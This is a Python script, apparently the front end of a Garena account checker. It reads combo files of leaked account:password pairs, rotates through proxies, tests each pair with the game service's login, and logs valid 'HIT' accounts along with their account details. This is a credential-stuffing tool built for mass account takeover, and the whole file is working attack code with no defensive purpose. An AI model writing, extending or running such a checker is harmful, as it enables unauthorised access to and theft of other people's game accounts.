import sys
import os
import json
import warnings
import tempfile

os.environ.setdefault("PYTHONIOENCODING", "utf-8")
warnings.filterwarnings("ignore")
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import io

sys.stdout = io.StringIO()
sys.stderr = io.StringIO()

_real_stdout = sys.__stdout__


def Minhnhatdev_emit(payload) -> None:
    _real_stdout.write(json.dumps(payload, ensure_ascii=False) + "\n")
    _real_stdout.flush()


def Minhnhatdev_format_result(garena, r: dict, account: str) -> dict:
    from hit_logger import format_hit_line, _derive_tinh_trang
    out = {
        "ok": True,
        "status": str(r.get("status") or "ERROR"),
        "detail": str(r.get("detail") or ""),
        "account": account,
        "uid": str(r.get("uid") or ""),
        "line": "",
        "tinh_trang": "",
    }
    if r.get("status") == "HIT":
        try:
            out["tinh_trang"] = _derive_tinh_trang(r)
            out["line"] = format_hit_line(r)
        except Exception:
            out["line"] = ""
    else:
        out["line"] = out["detail"] or out["status"]
    return out


def Minhnhatdev_load_engine():
    try:
        import garena
        if not hasattr(garena, "_proxy_type_lock"):
            import threading
            garena._proxy_type_lock = threading.Lock()
        return garena, None
    except Exception as e:
        return None, f"import_error: {e}"


def Minhnhatdev_prepare_proxy(garena, proxy_file: str):
    if not proxy_file or not os.path.isfile(proxy_file):
        return None
    try:
        garena.load_proxies(proxy_file)
        return garena._next_proxy()
    except Exception:
        return None


def Minhnhatdev_run_single(account: str, password: str, proxy=None) -> dict:
    garena, err = Minhnhatdev_load_engine()
    if err:
        return {"ok": False, "status": "ERROR", "detail": err}
    try:
        r = garena.check_login(account, password, fetch_info=True, proxy=proxy, debug=False)
    except Exception as e:
        return {"ok": False, "status": "ERROR", "detail": f"check_error: {e}"}
    return Minhnhatdev_format_result(garena, r, account)


def Minhnhatdev_run_bulk(combo_file: str, proxy_file: str = "") -> None:
    garena, err = Minhnhatdev_load_engine()
    if err:
        Minhnhatdev_emit({"type": "error", "detail": err})
        return
    try:
        combos = garena.load_combos(combo_file)
    except Exception as e:
        Minhnhatdev_emit({"type": "error", "detail": f"combo_error: {e}"})
        return
    total = len(combos)
    Minhnhatdev_emit({"type": "start", "total": total})

    proxy = Minhnhatdev_prepare_proxy(garena, proxy_file)
    done = hits = fails = 0
    for acc, pw in combos:
        acc = acc.strip()
        if not acc:
            continue
        try:
            r = garena.check_login(acc, pw, fetch_info=True, proxy=proxy, debug=False)
        except Exception as e:
            r = {"status": "ERROR", "detail": f"check_error: {e}"}
        res = Minhnhatdev_format_result(garena, r, acc)
        done += 1
        if res["status"] == "HIT":
            hits += 1
        else:
            fails += 1
        Minhnhatdev_emit({
            "type": "result",
            "done": done,
            "total": total,
            "hits": hits,
            "fails": fails,
            "account": acc,
            "status": res["status"],
            "line": res["line"],
            "tinh_trang": res["tinh_trang"],
            "detail": res["detail"],
        })
    Minhnhatdev_emit({"type": "done", "total": total, "hits": hits, "fails": fails})


def main() -> int:
    args = sys.argv[1:]
    proxy_file = ""
    if "--proxy" in args:
        i = args.index("--proxy")
        if i + 1 < len(args):
            proxy_file = args[i + 1]
            args = args[:i] + args[i + 2:]
    bulk_mode = False
    if "--bulk" in args:
        bulk_mode = True
        args = [a for a in args if a != "--bulk"]

    if bulk_mode:
        if len(args) < 1:
            Minhnhatdev_emit({"type": "error", "detail": "usage: Minhnhatdev_api.py --bulk <combo_file> [--proxy proxy_file]"})
            return 2
        Minhnhatdev_run_bulk(args[0], proxy_file)
        return 0

    if len(args) < 2:
        Minhnhatdev_emit({"ok": False, "status": "ERROR", "detail": "usage: Minhnhatdev_api.py <account> <password> [--proxy proxy_file]"})
        return 2

    account = args[0].strip()
    password = args[1]
    if not account or not password:
        Minhnhatdev_emit({"ok": False, "status": "ERROR", "detail": "empty credentials"})
        return 2

    garena, err = Minhnhatdev_load_engine()
    if err:
        Minhnhatdev_emit({"ok": False, "status": "ERROR", "detail": err})
        return 1
    proxy = Minhnhatdev_prepare_proxy(garena, proxy_file)
    Minhnhatdev_emit(Minhnhatdev_run_single_safe(garena, account, password, proxy))
    return 0


def Minhnhatdev_run_single_safe(garena, account, password, proxy):
    try:
        r = garena.check_login(account, password, fetch_info=True, proxy=proxy, debug=False)
    except Exception as e:
        return {"ok": False, "status": "ERROR", "detail": f"check_error: {e}"}
    return Minhnhatdev_format_result(garena, r, account)


if __name__ == "__main__":
    raise SystemExit(main())
